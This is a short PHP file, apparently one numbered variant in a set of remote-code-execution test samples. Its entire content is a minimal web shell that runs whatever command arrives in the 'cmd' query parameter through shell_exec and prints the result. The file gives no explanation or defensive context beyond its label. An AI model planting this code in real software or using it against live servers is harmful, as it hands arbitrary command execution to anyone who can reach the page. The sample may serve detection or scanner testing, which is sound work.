<?php
// RCE test variation #1389
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>